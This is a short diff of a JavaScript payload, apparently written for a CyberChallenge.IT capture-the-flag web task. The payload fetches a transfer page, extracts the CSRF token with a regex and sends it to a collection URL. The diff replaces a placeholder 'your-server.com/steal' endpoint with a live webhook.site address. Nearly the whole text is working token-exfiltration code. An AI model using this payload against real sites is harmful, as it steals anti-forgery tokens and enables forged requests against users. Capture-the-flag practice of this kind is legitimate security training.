@@ -3,6 +3,6 @@ fetch('http://buyflag.challs.cyberchallenge.it/transfer.php')
   .then(response => response.text())
   .then(data => {
     var csrfToken = data.match(/csrf_token_([^"]+)/)[1];
-    fetch('http://your-server.com/steal?token=' + csrfToken);
+    fetch('https://webhook.site/25a81222-fdec-414d-a6ea-19fd1a352749?token=' + csrfToken);
   });
 </script>
